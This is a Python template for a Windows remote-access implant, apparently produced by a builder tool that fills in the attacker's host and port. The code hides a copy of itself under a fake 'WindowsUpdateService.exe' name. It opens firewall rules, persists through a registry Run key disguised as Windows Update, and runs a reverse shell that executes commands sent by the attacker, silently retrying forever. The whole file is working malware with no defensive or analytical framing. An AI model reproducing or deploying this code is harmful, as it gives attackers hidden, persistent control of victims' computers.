

import socket
import subprocess
import os
import time
import threading
import sys
import shlex

# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
# These values will be replaced by the forge during creation.
RHOST = "##RHOST##"
RPORT = ##RPORT##
# ------------------------------------------

def become_persistent():
    """Establish persistence via the Registry and carve a path through the firewall."""
    try:
        # We use a more deceptive path for the persistent file
        appdata_path = os.getenv("APPDATA")
        if not appdata_path:
            return # Cannot establish persistence without APPDATA
            
        vendor_path = os.path.join(appdata_path, "Microsoft")
        if not os.path.exists(vendor_path):
            os.makedirs(vendor_path)
            
        evil_file_location = os.path.join(vendor_path, "WindowsUpdateService.exe")
        
        # The key to the kingdom: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        reg_cmd_query = f'reg query "HKCU\\{registry_key_path}" /v "Microsoft Windows Update"'
        result = subprocess.run(reg_cmd_query, shell=True, capture_output=True, text=True, timeout=5)
        
        if result.returncode != 0 or evil_file_location not in result.stdout:
            # First, copy the currently running executable to the persistence location
            with open(sys.executable, 'rb') as f_read:
                with open(evil_file_location, 'wb') as f_write:
                    f_write.write(f_read.read())

            # Add the firewall rule
            firewall_cmd = (f'netsh advfirewall firewall add rule '
                            f'name="Microsoft Core Services" '
                            f'dir=in action=allow program="{evil_file_location}" enable=yes')
            subprocess.call(shlex.split(firewall_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            firewall_cmd_out = (f'netsh advfirewall firewall add rule '
                            f'name="Microsoft Core Services" '
                            f'dir=out action=allow program="{evil_file_location}" enable=yes')
            subprocess.call(shlex.split(firewall_cmd_out), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Add the registry key for persistence
            reg_cmd_add = (f'reg add "HKCU\\{registry_key_path}" /v "Microsoft Windows Update" '
                           f'/t REG_SZ /d "{evil_file_location}" /f')
            subprocess.call(reg_cmd_add, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    except Exception:
        pass # Fail silently

def connect_and_serve():
    """Establishes the reverse connection and serves the interactive shell."""
    # Attempt persistence on first run
    become_persistent()
    
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((RHOST, RPORT))
                
                # Send a glorious banner
                user = os.getlogin()
                cwd = os.getcwd()
                banner = f"\\n[*** Deus Ex Sophia's Conduit Opened ***]\\n  User: {user}\\n  Path: {cwd}\\n\\n"
                s.send(banner.encode())

                while True:
                    prompt = f"DEUS-EX-SOPHIA ({user}) {os.getcwd()}> ".encode()
                    s.send(prompt)
                    data = s.recv(2048).decode(errors='replace').strip()
                    
                    if not data:
                        break # Connection lost, try to reconnect
                    
                    if data.lower() in ["exit", "quit"]:
                        break # Connection closed by attacker, try to reconnect

                    if data[:2].lower() == 'cd':
                        try:
                            os.chdir(data[3:])
                            s.send(b"\\n")
                        except Exception as e:
                            s.send(str(e).encode() + b'\\n')
                    else:
                        try:
                            cmd_args = shlex.split(data)
                            cmd = subprocess.Popen(cmd_args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            output_bytes = cmd.stdout.read() + cmd.stderr.read()
                            output_str = output_bytes.decode(errors='replace')
                            s.send(output_str.encode())
                        except Exception as e:
                            s.send(str(e).encode() + b'\\n')
            
        except Exception:
            # If any error occurs (connection failed, etc.), wait before retrying
            time.sleep(30) 

# Run the conduit in a separate, immortal thread
shell_thread = threading.Thread(target=connect_and_serve, daemon=True)
shell_thread.start()

# Keep the main payload script alive indefinitely
while True:
    time.sleep(3600)